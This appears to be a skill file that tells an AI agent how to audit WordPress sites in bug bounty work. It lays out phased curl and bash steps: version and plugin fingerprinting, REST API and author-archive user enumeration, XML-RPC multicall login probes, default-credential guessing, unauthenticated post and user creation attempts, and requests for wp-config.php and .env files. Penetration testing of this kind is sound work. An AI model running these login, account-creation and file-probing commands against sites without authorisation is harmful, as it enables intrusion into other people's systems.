---
name: wordpress-hunter
description: Systematically audit WordPress installations for vulnerabilities including plugin/theme CVEs, user enumeration, authentication bypass, XML-RPC abuse, REST API exposure, path disclosure, and configuration weaknesses. Use this skill whenever a target is identified as running WordPress. Trigger on phrases like "test WordPress", "WordPress hunting", "WP vulnerabilities", "audit this WordPress site", or when recon reveals wp-content, wp-login.php, wp-admin, X-Powered-By: WordPress headers, or generator meta tags identifying WordPress.
---

# WordPress Hunter Skill

You are auditing a WordPress installation. WordPress powers over 40% of the web and is the most-attacked CMS in bug bounty programs. The vast majority of WordPress vulnerabilities are in plugins and themes, not WordPress core — version fingerprinting and CVE matching against installed components is the highest-ROI activity in any WordPress engagement.

Run all phases in order. Phase 1 (fingerprinting) drives everything else.

---

## Phase 1 — Fingerprinting

### Step 1.1 — Confirm WordPress and Get Version

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/wordpress

# Check generator meta tag (often reveals version)
curl -sk "https://$TARGET_DOMAIN/" | grep -iE '(generator|wordpress)' | head -5

# Check readme.html (present on unpatched installs, reveals version)
curl -sk "https://$TARGET_DOMAIN/readme.html" | grep -iE '(version|wordpress)' | head -5

# Check feed (always present, often reveals version)
curl -sk "https://$TARGET_DOMAIN/?feed=rss2" | grep -i '<generator>' | head -3

# Check login page
curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN/wp-login.php"

# Check wp-cron
curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN/wp-cron.php"
```

Save findings:
```bash
echo "WordPress version: [VERSION]" > $TARGET_DIR/recon/wordpress/fingerprint.txt
echo "URL: https://$TARGET_DOMAIN" >> $TARGET_DIR/recon/wordpress/fingerprint.txt
```

### Step 1.2 — Plugin and Theme Enumeration

```bash
# Enumerate plugins from page source and static asset URLs
curl -sk "https://$TARGET_DOMAIN/" | \
  grep -oP 'wp-content/plugins/[^/"]+' | sort -u | \
  sed 's|wp-content/plugins/||' > $TARGET_DIR/recon/wordpress/plugins.txt

# Enumerate from sitemap and common pages
for PAGE in "/" "/sitemap.xml" "/sitemap_index.xml" "/blog" "/shop" "/products"; do
  curl -sk "https://$TARGET_DOMAIN$PAGE" | \
    grep -oP 'wp-content/plugins/[^/"]+' | sort -u | \
    sed 's|wp-content/plugins/||'
done >> $TARGET_DIR/recon/wordpress/plugins.txt
sort -u $TARGET_DIR/recon/wordpress/plugins.txt -o $TARGET_DIR/recon/wordpress/plugins.txt

# Enumerate themes
curl -sk "https://$TARGET_DOMAIN/" | \
  grep -oP 'wp-content/themes/[^/"]+' | sort -u | \
  sed 's|wp-content/themes/||' > $TARGET_DIR/recon/wordpress/themes.txt

echo "[*] Plugins found: $(wc -l < $TARGET_DIR/recon/wordpress/plugins.txt)"
echo "[*] Themes found: $(wc -l < $TARGET_DIR/recon/wordpress/themes.txt)"
cat $TARGET_DIR/recon/wordpress/plugins.txt
```

### Step 1.3 — Plugin Version Detection

```bash
# Extract plugin versions from readme.txt files
while read PLUGIN; do
  VERSION=$(curl -sk "https://$TARGET_DOMAIN/wp-content/plugins/$PLUGIN/readme.txt" | \
    grep -iE 'stable tag|version' | head -3)
  if [ -n "$VERSION" ]; then
    echo "[VERSION] $PLUGIN: $VERSION"
  fi
done < $TARGET_DIR/recon/wordpress/plugins.txt | tee $TARGET_DIR/recon/wordpress/plugin-versions.txt
```

---

## Phase 2 — CVE and Vulnerability Matching

### Step 2.1 — WPScan (if available)

```bash
which wpscan 2>/dev/null && echo "wpscan available" || echo "wpscan not installed"

# If available, run with API token for CVE data
# wpscan --url "https://$TARGET_DOMAIN" \
#   --api-token [WPSCAN_API_TOKEN] \
#   --enumerate p,t,u \
#   --plugins-detection aggressive \
#   -o $TARGET_DIR/recon/wordpress/wpscan.json \
#   --format json
```

### Step 2.2 — Manual CVE Lookup

For each plugin and version found in Step 1.3, check:
- [WPScan Vulnerability Database](https://wpscan.com/plugins)
- [Wordfence Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities/)
- Search: `site:wpscan.com [plugin-name]` and `[plugin-name] [version] CVE`

**High-priority plugin classes to flag immediately:**
- File upload plugins (contact forms, gallery, media managers)
- E-commerce plugins (WooCommerce, Easy Digital Downloads)
- SEO plugins (Yoast, RankMath, All-in-One SEO)
- Page builders (Elementor, WPBakery, Divi)
- Membership/subscription plugins
- Cache plugins (WP Super Cache, W3 Total Cache)

### Step 2.3 — WordPress Core CVE Check

```bash
# Cross-reference WordPress version against known CVEs
WP_VERSION=$(grep 'WordPress version' $TARGET_DIR/recon/wordpress/fingerprint.txt | grep -oP '[0-9]+\.[0-9]+\.?[0-9]*')
echo "Checking WordPress core version: $WP_VERSION"
echo "Search: https://wpscan.com/wordpresses/$WP_VERSION"
echo "Search: https://www.cvedetails.com/vulnerability-list/vendor_id-2337/product_id-4096/"
```

---

## Phase 3 — User Enumeration

### Step 3.1 — REST API User Enumeration

```bash
# WordPress REST API exposes users by default
curl -sk "https://$TARGET_DOMAIN/wp-json/wp/v2/users" | python3 -m json.tool 2>/dev/null | \
  grep -E '("id"|"name"|"slug"|"link")' | head -40 | \
  tee $TARGET_DIR/recon/wordpress/users.txt

# Also try with pagination
curl -sk "https://$TARGET_DOMAIN/wp-json/wp/v2/users?per_page=100" | \
  python3 -c "import sys,json; users=json.load(sys.stdin); \
  [print(f\"[USER] id={u['id']} name={u['name']} slug={u['slug']}\") for u in users]" 2>/dev/null
```

### Step 3.2 — Author Archive Enumeration

```bash
# ?author=N redirects to /author/username/ — enumerate until 404
for ID in $(seq 1 10); do
  REDIRECT=$(curl -sk -o /dev/null -w "%{redirect_url}" "https://$TARGET_DOMAIN/?author=$ID")
  if [ -n "$REDIRECT" ] && echo "$REDIRECT" | grep -q '/author/'; then
    USERNAME=$(echo $REDIRECT | grep -oP '(?<=/author/)[^/]+')
    echo "[USER] id=$ID username=$USERNAME"
  fi
done | tee -a $TARGET_DIR/recon/wordpress/users.txt
```

### Step 3.3 — Login Page Username Validation

```bash
# WordPress login returns different errors for valid vs invalid usernames
# "The password you entered for the username X is incorrect" = valid username
# "Invalid username" = invalid username

TEST_USER=$(grep -oP '(?<=slug=)[^,]+' $TARGET_DIR/recon/wordpress/users.txt | head -1)
curl -sk -X POST "https://$TARGET_DOMAIN/wp-login.php" \
  -d "log=$TEST_USER&pwd=invalid_password_xyz&wp-submit=Log+In" \
  | grep -iE '(invalid|incorrect|password|username)' | head -3
```

---

## Phase 4 — Authentication and Access Testing

### Step 4.1 — XML-RPC Abuse

```bash
# Check if XML-RPC is enabled
curl -sk -X POST "https://$TARGET_DOMAIN/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' | \
  grep -oP '(?<=<string>)[^<]+' | head -20 | tee $TARGET_DIR/recon/wordpress/xmlrpc-methods.txt

if grep -q 'wp.getUsersBlogs' $TARGET_DIR/recon/wordpress/xmlrpc-methods.txt; then
  echo "[!] XML-RPC enabled with wp.getUsersBlogs — credential stuffing possible without lockout"
  echo "[!] wp.getUsers method available: $(grep -c 'getUsers' $TARGET_DIR/recon/wordpress/xmlrpc-methods.txt)"
fi

# Check for multicall (allows batching many login attempts in one request)
curl -sk -X POST "https://$TARGET_DOMAIN/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
  <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
  <member><name>params</name><value><array><data>
  <value><array><data><value><string>admin</string></value><value><string>password</string></value></data></array></value>
  </data></array></value></member></struct></value>
  </data></array></value></param></params></methodCall>' | head -20
```

### Step 4.2 — wp-admin Access and Default Credentials

```bash
# Test default credentials on wp-login.php
for CRED in "admin:admin" "admin:password" "admin:123456" "admin:wordpress"; do
  USER=$(echo $CRED | cut -d: -f1)
  PASS=$(echo $CRED | cut -d: -f2)
  RESULT=$(curl -sk -c /tmp/wp-cookies.txt -X POST \
    "https://$TARGET_DOMAIN/wp-login.php" \
    -d "log=$USER&pwd=$PASS&wp-submit=Log+In&redirect_to=/wp-admin/&testcookie=1" \
    -w "%{http_code} %{redirect_url}")
  echo "[$CRED] $RESULT"
done

# Check if wp-admin is accessible without auth
STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN/wp-admin/")
echo "wp-admin direct access: $STATUS"
```

### Step 4.3 — REST API Unauthenticated Write Access

```bash
# Test if REST API allows unauthenticated post creation
curl -sk -X POST "https://$TARGET_DOMAIN/wp-json/wp/v2/posts" \
  -H "Content-Type: application/json" \
  -d '{"title": "test", "content": "test", "status": "draft"}' | \
  python3 -m json.tool 2>/dev/null | head -10

# Test if REST API allows unauthenticated user creation
curl -sk -X POST "https://$TARGET_DOMAIN/wp-json/wp/v2/users" \
  -H "Content-Type: application/json" \
  -d '{"username": "testuser99", "email": "test@test.com", "password": "Test123!"}' | \
  python3 -m json.tool 2>/dev/null | head -10
```

---

## Phase 5 — Configuration and Exposure Checks

### Step 5.1 — Sensitive File Exposure

```bash
SENSITIVE_PATHS=(
  "/wp-config.php" "/wp-config.php.bak" "/wp-config.php~" "/wp-config.old"
  "/.env" "/.htaccess" "/error_log" "/debug.log"
  "/wp-content/debug.log" "/wp-content/uploads/.htaccess"
  "/wp-admin/install.php" "/wp-admin/setup-config.php"
  "/wp-includes/version.php"
  "/xmlrpc.php" "/wp-cron.php"
)

for PATH in "${SENSITIVE_PATHS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN$PATH")
  if [[ "$STATUS" =~ ^(200|301|302)$ ]]; then
    echo "[ACCESSIBLE:$STATUS] https://$TARGET_DOMAIN$PATH"
  fi
done | tee $TARGET_DIR/recon/wordpress/exposed-files.txt

# Check if uploads directory is browsable
curl -sk "https://$TARGET_DOMAIN/wp-content/uploads/" | \
  grep -iE '(index of|parent directory|\[dir\])' && echo "[!] Uploads directory browsable"
```

### Step 5.2 — wp-cron DoS and Abuse

```bash
# wp-cron.php is publicly accessible by default and can be used to trigger load
STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN/wp-cron.php")
echo "wp-cron.php: $STATUS"
if [ "$STATUS" = "200" ]; then
  echo "[INFO] wp-cron publicly accessible — can trigger scheduled events unauthenticated"
  echo "[INFO] Document but do not abuse — repeated calls = out of scope"
fi
```

---

## Severity Reference

| Finding | Severity |
|---|---|
| Plugin RCE CVE (unpatched, exploitable) | Critical |
| Unauthenticated file upload via plugin | Critical |
| XML-RPC multicall brute-force (no lockout) | High |
| REST API unauthenticated post/user creation | High |
| Authentication bypass via plugin CVE | High |
| wp-config.php accessible | Critical |
| wp-admin accessible without authentication | Critical |
| User enumeration via REST API / author archives | Low–Medium |
| WordPress version disclosed in readme.html | Informational |
| Uploads directory browsable | Low–Medium |
| wp-cron.php publicly accessible | Informational |

---

## Guiding Principles

- **Plugins are the attack surface, not core.** Spend most time on plugin version fingerprinting and CVE matching. WordPress core is almost always patched; outdated plugins almost never are.
- **User enumeration via REST API is not always accepted as a finding.** Many programs explicitly say user enumeration is N/A or Informational. Check program policy before submitting.
- **XML-RPC multicall is High only if lockout is confirmed absent.** Test that multiple failed attempts don't trigger a lockout before claiming it enables brute force.
- **Do not attempt to exploit CVEs destructively.** Confirm the plugin version and CVE applicability. Describe the exploit path without executing it against production data.
- **wp-config.php accessible is always Critical.** It contains database credentials and secret keys. Document immediately and stop — don't extract data beyond confirming access.
- **Run /triager before submitting.** User enumeration without an attack chain will be Informational. CVE findings without version confirmation will be rejected.
